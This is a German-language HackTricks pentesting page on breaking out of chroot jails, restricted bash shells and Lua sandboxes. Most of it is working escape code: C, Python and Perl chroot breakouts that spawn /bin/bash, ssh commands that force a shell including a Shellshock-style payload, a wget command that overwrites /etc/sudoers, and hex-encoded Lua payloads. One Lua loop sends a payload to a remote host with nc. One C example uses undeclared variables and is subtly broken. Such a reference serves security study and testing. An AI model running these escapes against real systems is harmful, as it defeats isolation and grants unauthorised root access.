# Ausbrechen aus Gefängnissen

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## **GTFOBins**

**Suche in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **ob du eine Binärdatei mit der "Shell"-Eigenschaft ausführen kannst**

## Chroot-Ausbrüche

Von [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Der chroot-Mechanismus ist **nicht dazu gedacht**, um gegen absichtliche Manipulationen durch **privilegierte** (**root**) **Benutzer** zu verteidigen. In den meisten Systemen stapeln sich chroot-Kontexte nicht richtig und chrooted Programme **mit ausreichenden Rechten können einen zweiten chroot durchführen, um auszubrechen**.\
Normalerweise bedeutet dies, dass du root innerhalb des chroot sein musst, um auszubrechen.

{% hint style="success" %}
Das **Tool** [**chw00t**](https://github.com/earthquake/chw00t) wurde entwickelt, um die folgenden Szenarien auszunutzen und aus `chroot` auszubrechen.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Wenn du **root** innerhalb eines chroot bist, **kannst du ausbrechen**, indem du **einen weiteren chroot** erstellst. Das liegt daran, dass 2 chroots nicht koexistieren können (in Linux), also wenn du einen Ordner erstellst und dann **einen neuen chroot** in diesem neuen Ordner erstellst, während du **außerhalb davon bist**, wirst du jetzt **außerhalb des neuen chroot** sein und somit im FS.

Dies geschieht, weil chroot normalerweise DEIN Arbeitsverzeichnis nicht in das angegebene verschiebt, sodass du einen chroot erstellen kannst, aber außerhalb davon bist.
{% endhint %}

Normalerweise wirst du die `chroot`-Binärdatei nicht innerhalb eines chroot-Gefängnisses finden, aber du **könntest eine Binärdatei kompilieren, hochladen und ausführen**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Gespeicherter fd

{% hint style="warning" %}
Dies ist ähnlich wie im vorherigen Fall, aber in diesem Fall **speichert der Angreifer einen Dateideskriptor für das aktuelle Verzeichnis** und **erstellt dann das chroot in einem neuen Ordner**. Schließlich hat er **Zugriff** auf diesen **FD** **außerhalb** des chroot, er greift darauf zu und **entkommt**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD kann über Unix Domain Sockets übergeben werden, also:

* Erstelle einen Kindprozess (fork)
* Erstelle UDS, damit Eltern- und Kindprozess kommunizieren können
* Führe chroot im Kindprozess in einem anderen Ordner aus
* Erstelle im Elternprozess einen FD eines Ordners, der außerhalb des neuen chroot des Kindprozesses liegt
* Übergebe diesen FD an den Kindprozess über die UDS
* Der Kindprozess wechselt in das Verzeichnis dieses FD, und da es außerhalb seines chroot ist, wird er aus dem Gefängnis entkommen
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Mounten des Root-Geräts (/) in ein Verzeichnis innerhalb des chroot
* Chrooten in dieses Verzeichnis

Das ist in Linux möglich
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Mount procfs in ein Verzeichnis innerhalb des chroot (falls es noch nicht geschehen ist)
* Suche nach einer PID, die einen anderen Root/CWD-Eintrag hat, wie: /proc/1/root
* Chroot in diesen Eintrag
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Erstelle einen Fork (Kindprozess) und chroot in einen anderen Ordner tiefer im FS und wechsle in ihn
* Bewege vom Elternprozess den Ordner, in dem sich der Kindprozess befindet, in einen Ordner vor dem chroot der Kinder
* Dieser Kinderprozess wird sich außerhalb des chroot finden
{% endhint %}

### ptrace

{% hint style="warning" %}
* Vor einiger Zeit konnten Benutzer ihre eigenen Prozesse von einem eigenen Prozess debuggen... aber das ist standardmäßig nicht mehr möglich
* Wenn es jedoch möglich ist, könntest du ptrace in einen Prozess und Shellcode darin ausführen ([siehe dieses Beispiel](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeration

Hole Informationen über das Gefängnis:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATH ändern

Überprüfen Sie, ob Sie die PATH-Umgebungsvariable ändern können.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Vim verwenden
```bash
:set shell=/bin/sh
:shell
```
### Erstelle Skript

Überprüfe, ob du eine ausführbare Datei mit _/bin/bash_ als Inhalt erstellen kannst.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Holen Sie sich bash von SSH

Wenn Sie über ssh zugreifen, können Sie diesen Trick verwenden, um eine bash-Shell auszuführen:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Erklären
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Sie können beispielsweise die sudoers-Datei überschreiben.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Andere Tricks

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Es könnte auch interessant sein, die Seite zu besuchen:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Jails

Tricks zum Entkommen aus Python-Jails auf der folgenden Seite:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

Auf dieser Seite finden Sie die globalen Funktionen, auf die Sie innerhalb von Lua zugreifen können: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval mit Befehlsausführung:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Einige Tricks, um **Funktionen einer Bibliothek ohne Verwendung von Punkten aufzurufen**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerieren Sie Funktionen einer Bibliothek:
```bash
for k,v in pairs(string) do print(k,v) end
```
Beachten Sie, dass sich **die Reihenfolge der Funktionen ändert**, jedes Mal, wenn Sie die vorherige Einzeile in einer **anderen Lua-Umgebung ausführen**. Daher können Sie, wenn Sie eine bestimmte Funktion ausführen müssen, einen Brute-Force-Angriff durchführen, indem Sie verschiedene Lua-Umgebungen laden und die erste Funktion der le-Bibliothek aufrufen:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Interaktive Lua-Shell erhalten**: Wenn Sie sich in einer eingeschränkten Lua-Shell befinden, können Sie eine neue Lua-Shell (und hoffentlich unbegrenzt) erhalten, indem Sie Folgendes aufrufen:
```bash
debug.debug()
```
## Referenzen

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Folien: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
